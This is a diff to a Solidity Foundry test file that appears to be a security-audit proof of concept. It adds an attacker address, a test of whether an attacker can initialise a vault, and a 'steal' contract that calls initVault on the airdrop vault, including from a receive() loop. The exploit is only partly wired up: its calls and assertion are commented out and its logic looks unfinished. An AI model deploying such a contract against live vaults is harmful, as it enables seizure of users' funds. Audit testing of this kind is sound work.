@@ -21,8 +21,10 @@ contract BaseTest is Test {
     Airdrop public airdropContract;
     Vault public airdropVault;
     Vault public stakingVault;
-
+  
     address deployer = makeAddr("deployer");
+    address attacker = makeAddr("attacker");
+    
     address soulmate1 = makeAddr("soulmate1");
     address soulmate2 = makeAddr("soulmate2");
 
@@ -51,13 +53,19 @@ contract BaseTest is Test {
             ILoveToken(address(loveToken)),
             address(airdropContract)
         );
-        stakingVault.initVault(
-            ILoveToken(address(loveToken)),
-            address(stakingContract)
-        );
+        // stakingVault.initVault(
+            // ILoveToken(address(loveToken)),
+            // address(stakingContract)
+        // );
 
         // init
         vm.stopPrank();
+    }
+    function test_attackercan_initvault()  public {
+        vm.prank(attacker);
+        steal _steal = new steal(address(airdropVault)); 
+        // _steal.execute();
+        // assertEq(stakingVault.vaultInitialize() , true );
     }
 
     function _mintOneTokenForBothSoulmates() internal {
@@ -93,3 +101,44 @@ contract BaseTest is Test {
         vm.stopPrank();
     }
 }
+    contract steal {
+        Vault public airdropVault;
+        Vault public stakingVault;
+        LoveToken public loveToken;
+        Airdrop public airdropContract;
+        Soulmate public soulmateContract;
+        constructor(address _vault){
+          airdropVault = Vault(_vault);
+        //   airdropVault = Vault(_vault);
+          stakingVault = new Vault();
+          soulmateContract = new Soulmate();
+          loveToken = new LoveToken(
+            ISoulmate(address(soulmateContract)),
+            address(airdropVault),
+            address(stakingVault)
+        );
+          airdropContract = new Airdrop(
+            ILoveToken(address(loveToken)),
+            ISoulmate(address(soulmateContract)),
+            IVault(address(airdropVault))
+        );
+        
+        }
+        function execute() external payable {
+            airdropVault.initVault(
+                ILoveToken(address(loveToken)),
+                address(airdropContract)
+            );
+            // console2.log(i+1);
+        }
+        receive() external payable {
+        
+            while(loveToken.totalSupply() > 0)
+            airdropVault.initVault(
+                ILoveToken(address(loveToken)),
+                address(airdropContract)
+            );
+            
+        }
+    
+    }
